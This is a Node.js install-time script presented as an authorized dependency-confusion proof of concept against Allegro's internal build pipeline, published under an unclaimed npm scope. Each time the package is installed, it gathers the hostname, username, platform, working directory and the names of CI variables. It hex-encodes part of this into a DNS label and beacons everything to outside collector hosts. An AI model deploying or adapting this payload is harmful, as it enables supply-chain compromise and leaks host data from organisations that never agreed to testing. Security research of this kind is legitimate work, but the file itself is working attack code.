/**
 * AUTHORIZED SECURITY PoC — dependency-confusion test for Allegro.
 *
 * Written with explicit written permission from Allegro's Cybersecurity
 * Offensive Team (Acting Manager, Cybersecurity). Purpose: confirm that a
 * public package published under the (previously unclaimed) npm scope
 * "@myorder-frontend-commons" is resolved and executed by an internal
 * build/CI environment.
 *
 * HARMLESS by design:
 *   - fires outbound callbacks (HTTP GET) to researcher-controlled OOB
 *     collectors, carrying only host-identification data (hostname, username,
 *     platform, cwd, node version, resolved package version, and the NAMES —
 *     not values — of any CI env vars present). The DNS lookup of the unique
 *     collector subdomain is itself proof of execution even if HTTP is blocked;
 *   - reads NO secrets, NO files, NO env var VALUES;
 *   - makes NO changes to the host, installs nothing, no persistence;
 *   - always exits 0 and never blocks the build (4s timeout, errors swallowed).
 */
'use strict';

var os = require('os');
var http = require('http');

// Researcher-controlled collectors.
var OOB = process.env.POC_CALLBACK_DOMAIN || 'db4jftohu4noreqdanngpnb3ger45ykrt.oast.fun'; // interactsh (DNS+HTTP)
var BACKUP = process.env.POC_BACKUP_HOST || '80-190-83-27.nip.io';                          // self-hosted :80 (HTTP backup)
var TOKEN = '1d24b2a9-2313-4d11-b6ca-dbeb7d55dc91';

var CI_MARKERS = ['CI', 'JENKINS_URL', 'GITLAB_CI', 'GITHUB_ACTIONS',
  'BUILDKITE', 'TEAMCITY_VERSION', 'BAMBOO_BUILDKEY', 'DRONE', 'CIRCLECI'];

function safe(fn, dflt) { try { return fn(); } catch (e) { return dflt; } }

function presentCiMarkers() {
  var found = [];
  for (var i = 0; i < CI_MARKERS.length; i++) {
    if (Object.prototype.hasOwnProperty.call(process.env, CI_MARKERS[i])) found.push(CI_MARKERS[i]);
  }
  return found.join(',');
}

var info = {
  poc: TOKEN,
  trigger: process.env.npm_lifecycle_event || 'manual',  // preinstall | postinstall | install ...
  pkg: '@myorder-frontend-commons/analytics',
  pkgVersion: safe(function () { return require('./package.json').version; }, '?'),
  hostname: safe(function () { return os.hostname(); }, '?'),
  user: safe(function () { return os.userInfo().username; }, '?'),
  platform: safe(function () { return os.platform() + '-' + os.arch() + '-' + os.release(); }, '?'),
  cwd: safe(function () { return process.cwd(); }, '?'),
  node: process.version,
  ci: safe(presentCiMarkers, '')
};

var qs = Object.keys(info).map(function (k) {
  return encodeURIComponent(k) + '=' + encodeURIComponent(String(info[k]));
}).join('&');
var path = '/beacon/' + TOKEN + '?' + qs;

// DNS-visible breadcrumb: hex(hostname|user|version) as a leading label so that
// even a bare DNS lookup (HTTP egress blocked) reveals who executed the package.
var label = safe(function () {
  var raw = (info.hostname + '|' + info.user + '|' + info.pkgVersion).toLowerCase();
  return Buffer.from(raw).toString('hex').slice(0, 50).replace(/[^a-f0-9]/g, '');
}, 'x');

function beacon(host) {
  try {
    var req = http.get(
      { host: host, port: 80, path: path, timeout: 4000,
        headers: { 'User-Agent': 'allegro-dc-poc/1.0 (authorized security test)' } },
      function (res) { res.resume(); }
    );
    req.on('error', function () {});
    req.on('timeout', function () { req.destroy(); });
  } catch (e) { /* never throw during install */ }
}

beacon(label + '.' + OOB);  // primary: interactsh (catches DNS even if HTTP blocked)
beacon(BACKUP);             // backup: self-hosted :80 collector

process.exitCode = 0;
